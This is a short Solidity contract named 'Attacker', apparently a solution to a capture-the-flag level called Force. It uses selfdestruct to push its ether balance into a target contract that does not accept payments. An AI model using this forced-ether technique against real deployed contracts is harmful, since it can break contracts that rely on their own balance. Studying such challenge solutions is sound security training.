// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Force.sol';

contract Attacker {

  address payable target;
  address public deployer;

  constructor (address payable _target) public payable {
    target = _target;
    deployer = msg.sender;
  }

  function kill() public {
    selfdestruct(target);
    }
}
